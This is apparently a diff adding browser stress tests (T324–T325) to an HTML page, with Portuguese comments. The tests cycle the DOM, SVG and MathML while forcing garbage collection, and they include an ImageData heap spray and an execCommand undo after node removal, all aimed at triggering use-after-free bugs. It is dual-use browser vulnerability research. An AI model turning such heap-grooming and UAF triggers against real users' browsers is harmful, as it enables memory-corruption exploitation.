+        let obj = { data: new Uint8Array(50), length: 50 };
+        registry.register(obj, { data: new Uint8Array(50), length: i });
+        obj = null; // liberar para coleta
+      }
+      gcHeavy();
+    } catch(e){}
+  } catch(e){}
+  log('Teste 324: fim');
+}
+
+// ─── T325 ─────────────────────────────────────────────────────────────────────
+// STRESS FINAL T325: content-visibility + SVGUse + MathML + ImageData spray + execCommand
+// Combinação dos vetores mais específicos desta rodada em sequência rápida
+function t325(){
+  log('Teste 325: inicio');
+  try {
+    const area = document.getElementById('dom13');
+    area.style.display = 'block';
+
+    // === FASE 1: content-visibility UAF (T301 comprimido) ===
+    try {
+      const ctr325 = document.createElement('div');
+      const cld325 = document.createElement('div');
+      cld325.style.cssText = 'width:30px;height:30px;background:red;';
+      ctr325.appendChild(cld325);
+      area.appendChild(ctr325);
+
+      for(let i = 0; i < 10; i++){
+        try {
+          ctr325.style['content-visibility'] = 'hidden';
+          gc();
+          if(cld325.parentNode) ctr325.removeChild(cld325);
+          gc();
+          ctr325.style['content-visibility'] = 'auto';
+          let _ = ctr325.offsetHeight;
+          gc();
+          ctr325.appendChild(cld325);
+        } catch(e){}
+      }
+      area.removeChild(ctr325);
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 2: SVGUseElement href change + GC ===
+    try {
+      const svgNS = 'http://www.w3.org/2000/svg';
+      const svg325 = document.createElementNS(svgNS, 'svg');
+      svg325.setAttribute('width', '100'); svg325.setAttribute('height', '100');
+      const sym325 = document.createElementNS(svgNS, 'symbol');
+      sym325.id = 'stress325sym';
+      sym325.appendChild(document.createElementNS(svgNS, 'rect'));
+      svg325.appendChild(sym325);
+      const use325 = document.createElementNS(svgNS, 'use');
+      use325.setAttribute('href', '#stress325sym');
+      svg325.appendChild(use325);
+      area.appendChild(svg325);
+      for(let i = 0; i < 10; i++){
+        try {
+          use325.setAttribute('href', '#stress325sym_INVALID_' + i); gc();
+          svg325.removeChild(sym325); gc();
+          svg325.appendChild(sym325); gc();
+          use325.setAttribute('href', '#stress325sym'); gc();
+        } catch(e){}
+      }
+      area.removeChild(svg325);
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 3: MathML + GC ===
+    try {
+      const mathNS = 'http://www.w3.org/1998/Math/MathML';
+      const math325 = document.createElementNS(mathNS, 'math');
+      function fracN(n){ if(n<=0) return document.createElementNS(mathNS,'mn'); const f=document.createElementNS(mathNS,'mfrac'); f.appendChild(fracN(n-1)); f.appendChild(fracN(n-1)); return f; }
+      try { math325.appendChild(fracN(6)); } catch(e){}
+      area.appendChild(math325);
+      const nodes325 = Array.from(math325.querySelectorAll('*'));
+      for(let i = 0; i < nodes325.length; i += 5){
+        try { if(nodes325[i].parentNode){ nodes325[i].parentNode.removeChild(nodes325[i]); gc(); nodes325[i].parentNode && nodes325[i].parentNode.appendChild(nodes325[i]); } } catch(e){}
+      }
+      area.removeChild(math325);
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 4: ImageData 0x90 spray ===
+    try {
+      const spray325 = [];
+      for(let i = 0; i < 0x4000; i++) spray325.push(new ImageData(1, 0x90 / 4));
+      gc();
+      const views325 = spray325.map(function(d){ try { return new Uint32Array(d.data.buffer); } catch(e){ return null; } });
+      for(let i = 0; i < spray325.length; i += 2) spray325[i] = null;
+      gc();
+      // Criar iframes para ocupar slots
+      const frs325 = [];
+      for(let i = 0; i < 10; i++){
+        const fr = document.createElement('iframe'); fr.src = 'about:blank'; document.body.appendChild(fr); frs325.push(fr);
+      }
+      gc();
+      for(let fr of frs325) try { document.body.removeChild(fr); } catch(e){}
+      gc();
+    } catch(e){}
+
+    gcHeavy();
+
+    // === FASE 5: execCommand + DOM removal ===
+    try {
+      const edit325 = document.createElement('div');
+      edit325.contentEditable = 'true';
+      edit325.innerHTML = 'stress <b>bold</b> <i>italic</i> <u>underline</u>';
+      area.appendChild(edit325);
+      const sel325 = window.getSelection();
+      if(sel325){ try { const r = document.createRange(); r.selectNodeContents(edit325); sel325.removeAllRanges(); sel325.addRange(r); } catch(e){} }
+      for(let cmd of ['bold','italic','underline','removeFormat']){
+        try { document.execCommand(cmd); gc(); } catch(e){}
+      }
+      area.removeChild(edit325);
+      gc();
+      // Undo pós-remoção — EditCommand tem stale ptr
+      try { document.execCommand('undo'); gc(); } catch(e){}
+    } catch(e){}
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+    gcHeavy();
+  } catch(e){}
+  log('Teste 325: fim');
+}
+</script>
+</body>
+</html>
